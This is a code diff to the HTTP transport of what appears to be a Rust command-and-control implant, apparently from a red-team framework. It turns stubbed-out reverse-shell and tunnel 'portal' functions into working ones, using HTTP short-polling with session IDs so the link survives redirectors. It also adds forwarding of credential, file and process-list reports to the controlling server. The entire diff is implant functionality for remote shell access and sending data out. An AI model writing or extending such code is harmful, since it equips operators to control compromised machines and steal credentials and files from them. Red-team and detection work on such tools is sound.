@@ -89,7 +89,8 @@ static REPORT_CREDENTIAL_PATH: &str = "/c2.C2/ReportCredential";
 static REPORT_FILE_PATH: &str = "/c2.C2/ReportFile";
 static REPORT_PROCESS_LIST_PATH: &str = "/c2.C2/ReportProcessList";
 static REPORT_OUTPUT_PATH: &str = "/c2.C2/ReportOutput";
-static _REVERSE_SHELL_PATH: &str = "/c2.C2/ReverseShell";
+static REVERSE_SHELL_PATH: &str = "/c2.C2/ReverseShell";
+static CREATE_PORTAL_PATH: &str = "/c2.C2/CreatePortal";
 
 // Marshal: Encode and encrypt a message using the ChachaCodec
 // Uses the helper functions exported from pb::xchacha
@@ -166,6 +167,160 @@ impl std::fmt::Debug for HTTP {
 }
 
 impl HTTP {
+    async fn handle_short_poll_streaming<Req, Resp>(
+        &self,
+        mut rx: tokio::sync::mpsc::Receiver<Req>,
+        tx: tokio::sync::mpsc::Sender<Resp>,
+        path: &'static str,
+    ) -> Result<()>
+    where
+        Req: Message + Send + 'static,
+        Resp: Message + Default + Send + 'static,
+    {
+        // Generate a unique session ID so the redirector can maintain a persistent
+        // gRPC stream across multiple HTTP short-poll requests.
+        let session_id = uuid::Uuid::new_v4().to_string();
+
+        loop {
+            // Buffer to hold messages to send in this polling interval
+            let mut messages = Vec::new();
+
+            // Check if there's any outgoing message (blocks until one is available or channel closed)
+            match tokio::time::timeout(std::time::Duration::from_millis(50), rx.recv()).await {
+                Ok(Some(msg)) => {
+                    messages.push(msg);
+
+                    // Grab any other immediately available messages
+                    while let Ok(msg) = rx.try_recv() {
+                        messages.push(msg);
+                    }
+                }
+                Ok(None) => {
+                    // Channel closed, terminate streaming
+                    break;
+                }
+                Err(_) => {
+                    // Timeout (50ms elapsed, no message). Continue loop to send empty payload/ping
+                }
+            }
+
+            let data_sent = !messages.is_empty();
+
+            // Prepare the body with encoded gRPC frames
+            let mut request_body = BytesMut::new();
+            for msg in messages {
+                let request_bytes = match marshal_with_codec::<Req, Resp>(msg) {
+                    Ok(bytes) => bytes,
+                    Err(err) => {
+                        #[cfg(debug_assertions)]
+                        log::error!("Failed to marshal streaming message: {}", err);
+                        continue;
+                    }
+                };
+                let frame_header = grpc_frame::FrameHeader::new(request_bytes.len() as u32);
+                request_body.extend_from_slice(&frame_header.encode());
+                request_body.extend_from_slice(&request_bytes);
+            }
+
+            // Build and send the HTTP request with session header for persistent stream routing
+            let uri = self.build_uri(path)?;
+            let req = self
+                .request_builder(uri)
+                .header("X-Stream-Session-Id", &session_id)
+                .body(hyper_legacy::Body::from(request_body.freeze()))
+                .context("Failed to build HTTP request")?;
+
+            let response = match tokio::time::timeout(
+                std::time::Duration::from_secs(30),
+                self.send_and_validate(req),
+            )
+            .await
+            {
+                Ok(Ok(resp)) => resp,
+                Ok(Err(err)) => {
+                    #[cfg(debug_assertions)]
+                    log::error!("Failed to send short poll HTTP request: {}", err);
+                    tokio::time::sleep(std::time::Duration::from_secs(1)).await;
+                    continue;
+                }
+                Err(_) => {
+                    #[cfg(debug_assertions)]
+                    log::error!("Short poll HTTP request timed out after 30s");
+                    tokio::time::sleep(std::time::Duration::from_secs(1)).await;
+                    continue;
+                }
+            };
+
+            // Read entire response body then decode gRPC frames and send via async channel.
+            // We cannot use stream_grpc_frames here because its handler closure is synchronous,
+            // and tokio::sync::mpsc::Sender requires async send (blocking_send panics in async context).
+            let body_bytes = Self::read_response_body(response).await;
+            let mut data_received = false;
+            let result: Result<()> = match body_bytes {
+                Ok(bytes) => {
+                    #[cfg(debug_assertions)]
+                    if !bytes.is_empty() {
+                        log::debug!("Received short poll response body: {} bytes", bytes.len());
+                    }
+                    let mut buffer = BytesMut::from(bytes.as_ref());
+                    let mut send_err = None;
+                    let mut frame_count = 0;
+                    while let Some((_header, encrypted_message)) =
+                        grpc_frame::FrameHeader::extract_frame(&mut buffer)
+                    {
+                        frame_count += 1;
+                        data_received = true;
+                        #[cfg(debug_assertions)]
+                        log::debug!(
+                            "Extracted frame {} from short poll response ({} bytes)",
+                            frame_count,
+                            encrypted_message.len()
+                        );
+
+                        match unmarshal_with_codec::<Req, Resp>(&encrypted_message) {
+                            Ok(response_msg) => {
+                                #[cfg(debug_assertions)]
+                                log::debug!("Unmarshaled message {} from short poll response, sending to channel", frame_count);
+
+                                if let Err(err) = tx.send(response_msg).await {
+                                    send_err = Some(anyhow::anyhow!(
+                                        "Failed to send response through channel: {}",
+                                        err
+                                    ));
+                                    break;
+                                }
+                            }
+                            Err(err) => {
+                                send_err = Some(err);
+                                break;
+                            }
+                        }
+                    }
+                    match send_err {
+                        Some(err) => Err(err),
+                        None => Ok(()),
+                    }
+                }
+                Err(err) => Err(err),
+            };
+
+            if let Err(err) = result {
+                #[cfg(debug_assertions)]
+                log::error!("Failed to process response frames: {}", err);
+                break;
+            }
+
+            // Adding a small delay to prevent tight loop spinning if rx channel isn't busy
+            if data_sent || data_received {
+                tokio::task::yield_now().await;
+            } else {
+                tokio::time::sleep(std::time::Duration::from_millis(500)).await;
+            }
+        }
+
+        Ok(())
+    }
+
     /// Build URI from path
     fn build_uri(&self, path: &str) -> Result<hyper_legacy::Uri> {
         let url = format!("{}{}", self.base_url, path);
@@ -178,6 +333,7 @@ impl HTTP {
             .method(hyper_legacy::Method::POST)
             .uri(uri)
             .header("Content-Type", "application/grpc")
+            .header("Connection", "close")
     }
 
     /// Send HTTP request and validate status code
@@ -537,22 +693,43 @@ impl Transport for HTTP {
 
     async fn reverse_shell(
         &mut self,
-        _rx: tokio::sync::mpsc::Receiver<ReverseShellRequest>,
-        _tx: tokio::sync::mpsc::Sender<ReverseShellResponse>,
+        rx: tokio::sync::mpsc::Receiver<ReverseShellRequest>,
+        tx: tokio::sync::mpsc::Sender<ReverseShellResponse>,
     ) -> Result<()> {
-        Err(anyhow::anyhow!(
-            "http/1.1 transport does not support reverse shell"
-        ))
+        // Spawn polling loop in background and return immediately.
+        // The caller (pty.rs) expects reverse_shell() to return so the input
+        // handling loop can run concurrently, matching the gRPC transport behavior.
+        let transport = self.clone();
+        tokio::spawn(async move {
+            if let Err(_err) = transport
+                .handle_short_poll_streaming(rx, tx, REVERSE_SHELL_PATH)
+                .await
+            {
+                #[cfg(debug_assertions)]
+                log::error!("reverse_shell short poll streaming ended: {}", _err);
+            }
+        });
+        Ok(())
     }
 
     async fn create_portal(
         &mut self,
-        _rx: tokio::sync::mpsc::Receiver<CreatePortalRequest>,
-        _tx: tokio::sync::mpsc::Sender<CreatePortalResponse>,
+        rx: tokio::sync::mpsc::Receiver<CreatePortalRequest>,
+        tx: tokio::sync::mpsc::Sender<CreatePortalResponse>,
     ) -> Result<()> {
-        Err(anyhow::anyhow!(
-            "http/1.1 transport does not support portal"
-        ))
+        // Spawn polling loop in background and return immediately,
+        // matching the gRPC transport behavior.
+        let transport = self.clone();
+        tokio::spawn(async move {
+            if let Err(_err) = transport
+                .handle_short_poll_streaming(rx, tx, CREATE_PORTAL_PATH)
+                .await
+            {
+                #[cfg(debug_assertions)]
+                log::error!("create_portal short poll streaming ended: {}", _err);
+            }
+        });
+        Ok(())
     }
 
     fn get_type(&mut self) -> pb::c2::transport::Type {
@@ -565,6 +742,170 @@ impl Transport for HTTP {
 
     fn name(&self) -> &'static str {
         "http"
+    }
+
+    async fn forward_raw(
+        &mut self,
+        path: String,
+        mut rx: tokio::sync::mpsc::Receiver<Vec<u8>>,
+        tx: tokio::sync::mpsc::Sender<Vec<u8>>,
+    ) -> anyhow::Result<()> {
+        let uri = self.build_uri(&path)?;
+        let parts: Vec<&str> = path.split('/').collect();
+        let method_name = *parts.get(2).unwrap_or(&"");
+
+        match method_name {
+            "ClaimTasks" | "ReportCredential" | "ReportProcessList" | "ReportOutput" => {
+                let req_bytes = rx
+                    .recv()
+                    .await
+                    .ok_or_else(|| anyhow::anyhow!("No input for unary call"))?;
+                let req = self
+                    .request_builder(uri)
+                    .body(hyper_legacy::Body::from(req_bytes))
+                    .context("Failed to build HTTP request")?;
+
+                let response = self.send_and_validate(req).await?;
+                let body_bytes = Self::read_response_body(response).await?;
+                tx.send(body_bytes.to_vec())
+                    .await
+                    .map_err(|e| anyhow::anyhow!("Send failed: {}", e))?;
+            }
+            "FetchAsset" => {
+                let req_bytes = rx
+                    .recv()
+                    .await
+                    .ok_or_else(|| anyhow::anyhow!("No input for FetchAsset"))?;
+                let req = self
+                    .request_builder(uri)
+                    .body(hyper_legacy::Body::from(req_bytes))
+                    .context("Failed to build HTTP request")?;
+
+                let response = self.send_and_validate(req).await?;
+                let mut body = response.into_body();
+                let mut buffer = BytesMut::new();
+
+                loop {
+                    while let Some((_header, encrypted_message)) =
+                        grpc_frame::FrameHeader::extract_frame(&mut buffer)
+                    {
+                        let chunk = encrypted_message.to_vec();
+                        tx.send(chunk)
+                            .await
+                            .map_err(|e| anyhow::anyhow!("Send failed: {}", e))?;
+                    }
+
+                    match body.data().await {
+                        Some(Ok(chunk)) => {
+                            buffer.extend_from_slice(&chunk);
+                        }
+                        Some(Err(err)) => {
+                            return Err(anyhow::anyhow!("Failed to read chunk: {}", err))
+                        }
+                        None => break,
+                    }
+                }
+            }
+            "ReportFile" => {
+                let (mut req_tx, body) = hyper_legacy::Body::channel();
+
+                tokio::spawn(async move {
+                    while let Some(req_chunk) = rx.recv().await {
+                        let frame_header = grpc_frame::FrameHeader::new(req_chunk.len() as u32);
+                        if req_tx
+                            .send_data(hyper_legacy::body::Bytes::from(
+                                frame_header.encode().to_vec(),
+                            ))
+                            .await
+                            .is_err()
+                        {
+                            break;
+                        }
+                        if req_tx
+                            .send_data(hyper_legacy::body::Bytes::from(req_chunk))
+                            .await
+                            .is_err()
+                        {
+                            break;
+                        }
+                    }
+                });
+
+                let req = self
+                    .request_builder(uri)
+                    .body(body)
+                    .context("Failed to build HTTP request")?;
+
+                let response = self.send_and_validate(req).await?;
+                let body_bytes = Self::read_response_body(response).await?;
+                tx.send(body_bytes.to_vec())
+                    .await
+                    .map_err(|e| anyhow::anyhow!("Send failed: {}", e))?;
+            }
+            "ReverseShell" | "CreatePortal" => {
+                let (mut req_tx, body) = hyper_legacy::Body::channel();
+
+                tokio::spawn(async move {
+                    while let Some(req_chunk) = rx.recv().await {
+                        let frame_header = grpc_frame::FrameHeader::new(req_chunk.len() as u32);
+                        if req_tx
+                            .send_data(hyper_legacy::body::Bytes::from(
+                                frame_header.encode().to_vec(),
+                            ))
+                            .await
+                            .is_err()
+                        {
+                            break;
+                        }
+                        if req_tx
+                            .send_data(hyper_legacy::body::Bytes::from(req_chunk))
+                            .await
+                            .is_err()
+                        {
+                            break;
+                        }
+                    }
+                });
+
+                let req = self
+                    .request_builder(uri)
+                    .body(body)
+                    .context("Failed to build HTTP request")?;
+
+                let response = self.send_and_validate(req).await?;
+                let mut body = response.into_body();
+                let mut buffer = BytesMut::new();
+
+                loop {
+                    while let Some((_header, encrypted_message)) =
+                        grpc_frame::FrameHeader::extract_frame(&mut buffer)
+                    {
+                        let chunk = encrypted_message.to_vec();
+                        if tx.send(chunk).await.is_err() {
+                            // Forwarding channel closed, we can break out of sending
+                            break;
+                        }
+                    }
+
+                    match body.data().await {
+                        Some(Ok(chunk)) => {
+                            buffer.extend_from_slice(&chunk);
+                        }
+                        Some(Err(err)) => {
+                            return Err(anyhow::anyhow!("Failed to read chunk: {}", err))
+                        }
+                        None => break,
+                    }
+                }
+            }
+            _ => {
+                return Err(anyhow::anyhow!(
+                    "Unsupported HTTP method for raw forwarding: {}",
+                    method_name
+                ));
+            }
+        }
+        Ok(())
     }
 
     fn list_available(&self) -> Vec<String> {
